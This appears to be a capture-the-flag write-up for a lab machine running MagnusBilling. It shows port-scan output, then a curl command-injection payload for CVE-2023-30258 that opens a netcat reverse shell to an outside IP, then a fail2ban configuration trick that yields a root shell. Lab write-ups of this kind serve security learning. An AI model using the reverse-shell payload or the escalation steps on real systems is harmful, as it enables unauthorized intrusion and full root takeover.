---
tags:
  - "#fail2ban"
  - "#magnusbilling"
  - "#CVE-2023-30258"
difficulty: Easy
---
---
# Recon
- rustscan
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukT/TLi8Po4V6OZVI6yhgSlTaANGLErWG2Hqz9UOxX3XXMFvRe0uivnYlcvBwvSe09IcHjC6qczRgRjdqQOxF2XHUIFBgPjNOR3mb1kfWg5jKAGun6+J9atS8z+5d6CZuv0YWH6jGJTQ1YS9vGNuFvE3coJKSBYtNbpJgBApX67tCQ4YKenrG/AQddi3zZz3mMHN6QldivMC+NCFp+PozjjoJgD4WULCElDwW4IgWjq64bL3Y/+Ii/PnPfLufZwaJNy67TjKv1KKzW0ag2UxqgTjc85feWAxvdWKVoX5FIhCrYwi6Q23BpTDqLSXoJ3irVCdVAqHfyqR72emcEgoWaxseXn2R68SptxxrUcpoMYUXtO1/0MZszBJ5tv3FBfY3NmCeGNwA98JXnJEb+3A1FU/LLN+Ah/Rl40NhrYGRqJcvz/UPreE73G/wjY8LAUnvamR/ybAPDkO+OP47OjPnQwwbmAW6g6BInnx9Ls5XBwULmn0ubMPi6dNWtQDZ0/U=
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBVI/7v4DHnwY/FkhLBQ71076mt5xG/9agRtb+vldezX9vOC2UgKnU6N+ySrhLEx2snCFNJGG0dukytLDxxKIcw=
|   256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII6ogE6DWtLYKAJo+wx+orTODOdYM23iJgDGE2l79ZBN
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.130.88/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
```

- Port: 22, 80, 3306, 5038
### Port 80
- Server: `Apache httpd 2.4.56`
- Directory: `/mbilling/`, `robots.txt`

- `http://10.10.130.88/mbilling/`

![](../../Image/Pasted%20image%2020250429172223.png)

### ffuf

![](../../Image/Pasted%20image%2020250429173716.png)

- README.md

![](../../Image/Pasted%20image%2020250429175638.png)

- `MagnusBilling version 7.x.x` -> **CVE-2023-30258**

# Privileged Escalation
## user shell

```
curl -s 'http://10.10.130.88/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.152.228 443 >/tmp/f;'
```

![](../../Image/Pasted%20image%2020250429181019.png)

![](../../Image/Pasted%20image%2020250429181043.png)

- Navigation: `/home/magnus`

![](../../Image/Pasted%20image%2020250429183034.png)
## root shell

- `sudo -l`

![](../../Image/Pasted%20image%2020250429181109.png)

- `find / -perm -4000 2>/dev/null` -> Find SUID

![](../../Image/Pasted%20image%2020250429201211.png)
### pkexec
- `pkexec --version`

![](../../Image/Pasted%20image%2020250429183208.png)

=> pkexec version 0.105 -> [Exploiting pkexec Version 0.105 (CVE-2021-4034)](https://www.bing.com/ck/a?!&&p=e2df58a65996d84cd54a94932239873509dd0069cf3df889d3d8e920fe332acaJmltdHM9MTc0NTg4NDgwMA&ptn=3&ver=2&hsh=4&fclid=0bcc7c1f-e4ee-69e1-10b8-6c7fe59168ef&psq=pkexec+version+0.105&u=a1aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvUHduS2l0&ntb=1)

![](../../Image/Pasted%20image%2020250429182829.png)

- I have tried but not succeed.

### fail2ban
- **Reference:** [Fail2Ban – Linux Privilege Escalation - Juggernaut-Sec](https://juggernaut-sec.com/fail2ban-lpe/)
#### fail2ban enumeration

```
fail2ban-client --version
```

![](../../Image/Pasted%20image%2020250429200912.png)

```
systemctl status fail2ban
```

![](../../Image/Pasted%20image%2020250429201840.png)

```
ps -ef | grep -i "fail2ban"
```

![](../../../Image/Pasted%20image%2020250429202151.png)

#### Quickcap of enumeration
- The version of Fail2Ban running is **0.11.2** => can be exploited
- Fail2Ban has default jail timers setup and configured to protect SSH
- Don't have writing permissions to the **action.d** directory => copy it on **/tmp**
- The **fail2ban** service is running as root => used for privileged escalation
- Our current user has **sudo** permissions to restart the **fail2ban** service

#### fail2ban exploiting

- Copy the `/etc/fail2ban` into `/tmp` .
```
rsync -av /etc/fail2ban/ /tmp/fail2ban/
```

- Configure **fail2ban** with new update.
```
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

- After restarting, fail2ban will create **/tmp/bash** - ELF running under **root** permission => help escalate.

![](../../../Image/Pasted%20image%2020250430221807.png)

- `/tmp/bash -p` => access root terminal.

![](../../Image/Pasted%20image%2020250430221732.png)